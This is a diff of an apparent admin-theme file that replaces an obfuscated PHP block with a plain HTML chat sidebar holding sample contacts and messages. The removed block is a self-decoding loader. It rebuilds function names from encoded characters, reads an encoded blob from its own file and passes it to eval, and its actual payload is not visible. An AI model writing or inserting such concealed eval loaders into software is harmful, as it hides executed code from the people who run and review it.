@@ -1,1 +1,112 @@
-<?php /* www.PhpSoftwares.com */$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');$GLOBALS['OOO0000O0']=$OOO000000{4}.$OOO000000{9}.$OOO000000{3}.$OOO000000{5}.$OOO000000{2}.$OOO000000{10}.$OOO000000{13}.$OOO000000{16};$GLOBALS['OOO0000O0'].=$GLOBALS['OOO0000O0']{3}.$OOO000000{11}.$OOO000000{12}.$GLOBALS['OOO0000O0']{7}.$OOO000000{5};$GLOBALS['OOO000O00']=$OOO000000{0}.$OOO000000{12}.$OOO000000{7}.$OOO000000{5}.$OOO000000{15};$GLOBALS['O0O000O00']=$OOO000000{0}.$OOO000000{1}.$OOO000000{5}.$OOO000000{14};$GLOBALS['O0O000O00']=$O0O000O00.$OOO000000{3};$GLOBALS['O0O00OO00']=$OOO000000{0}.$OOO000000{8}.$OOO000000{5}.$OOO000000{9}.$OOO000000{16};$GLOBALS['OOO00000O']=$OOO000000{3}.$OOO000000{14}.$OOO000000{8}.$OOO000000{14}.$OOO000000{8};$OOO0O0O00=__FILE__;$OO00O0000=0x1144;eval($GLOBALS['OOO0000O0']('JE8wMDBPME8wMD0kR0xPQkFMU1snT09PMDAwTzAwJ10oJE9PTzBPME8wMCwncmInKTskR0xPQkFMU1snTzBPMDBPTzAwJ10oJE8wMDBPME8wMCwweDUxOCk7JE9PMDBPMDBPMD0kR0xPQkFMU1snT09PMDAwME8wJ10oJEdMT0JBTFNbJ09PTzAwMDAwTyddKCRHTE9CQUxTWydPME8wME9PMDAnXSgkTzAwME8wTzAwLDB4MjJjKSwnWE5peW5Ud2Z1alBDWW9xN3pnK1N4YVc4SzN0RXJBOUpWc0hHTzQxL3ZtYmxJcFJCZVVrTWNkWjUyREZRTDBoNj0nLCdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSsvJykpO2V2YWwoJE9PMDBPMDBPMCk7'));return;?>Qx~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`FcTV~qFkE
+<div id="chat" class="fixed" data-current-user="Art Ramadani" data-order-by-status="1" data-max-chat-history="25">
+	
+	<div class="chat-inner">
+	
+		
+		<h2 class="chat-header">
+			<a href="#" class="chat-close" data-animate="1"><i class="entypo-cancel"></i></a>
+			
+			<i class="entypo-users"></i>
+			Chat
+			<span class="badge badge-success is-hidden">0</span>
+		</h2>
+		
+		
+		<div class="chat-group" id="group-1">
+			<strong>Favorites</strong>
+			
+			<a href="#" id="sample-user-123" data-conversation-history="#sample_history"><span class="user-status is-online"></span> <em>Catherine J. Watkins</em></a>
+			<a href="#"><span class="user-status is-online"></span> <em>Nicholas R. Walker</em></a>
+			<a href="#"><span class="user-status is-busy"></span> <em>Susan J. Best</em></a>
+			<a href="#"><span class="user-status is-offline"></span> <em>Brandon S. Young</em></a>
+			<a href="#"><span class="user-status is-idle"></span> <em>Fernando G. Olson</em></a>
+		</div>
+		
+		
+		<div class="chat-group" id="group-2">
+			<strong>Work</strong>
+			
+			<a href="#"><span class="user-status is-offline"></span> <em>Robert J. Garcia</em></a>
+			<a href="#" data-conversation-history="#sample_history_2"><span class="user-status is-offline"></span> <em>Daniel A. Pena</em></a>
+			<a href="#"><span class="user-status is-busy"></span> <em>Rodrigo E. Lozano</em></a>
+		</div>
+		
+		
+		<div class="chat-group" id="group-3">
+			<strong>Social</strong>
+			
+			<a href="#"><span class="user-status is-busy"></span> <em>Velma G. Pearson</em></a>
+			<a href="#"><span class="user-status is-offline"></span> <em>Margaret R. Dedmon</em></a>
+			<a href="#"><span class="user-status is-online"></span> <em>Kathleen M. Canales</em></a>
+			<a href="#"><span class="user-status is-offline"></span> <em>Tracy J. Rodriguez</em></a>
+		</div>
+	
+	</div>
+	
+	<!-- conversation template -->
+	<div class="chat-conversation">
+		
+		<div class="conversation-header">
+			<a href="#" class="conversation-close"><i class="entypo-cancel"></i></a>
+			
+			<span class="user-status"></span>
+			<span class="display-name"></span> 
+			<small></small>
+		</div>
+		
+		<ul class="conversation-body">	
+		</ul>
+		
+		<div class="chat-textarea">
+			<textarea class="form-control autogrow" placeholder="Type your message"></textarea>
+		</div>
+		
+	</div>
+	
+</div>
+
+
+<!-- Chat Histories -->
+<ul class="chat-history" id="sample_history">
+	<li>
+		<span class="user">Art Ramadani</span>
+		<p>Are you here?</p>
+		<span class="time">09:00</span>
+	</li>
+	
+	<li class="opponent">
+		<span class="user">Catherine J. Watkins</span>
+		<p>This message is pre-queued.</p>
+		<span class="time">09:25</span>
+	</li>
+	
+	<li class="opponent">
+		<span class="user">Catherine J. Watkins</span>
+		<p>Whohoo!</p>
+		<span class="time">09:26</span>
+	</li>
+	
+	<li class="opponent unread">
+		<span class="user">Catherine J. Watkins</span>
+		<p>Do you like it?</p>
+		<span class="time">09:27</span>
+	</li>
+</ul>
+
+
+
+
+<!-- Chat Histories -->
+<ul class="chat-history" id="sample_history_2">
+	<li class="opponent unread">
+		<span class="user">Daniel A. Pena</span>
+		<p>I am going out.</p>
+		<span class="time">08:21</span>
+	</li>
+	
+	<li class="opponent unread">
+		<span class="user">Daniel A. Pena</span>
+		<p>Call me when you see this message.</p>
+		<span class="time">08:27</span>
+	</li>
+</ul>
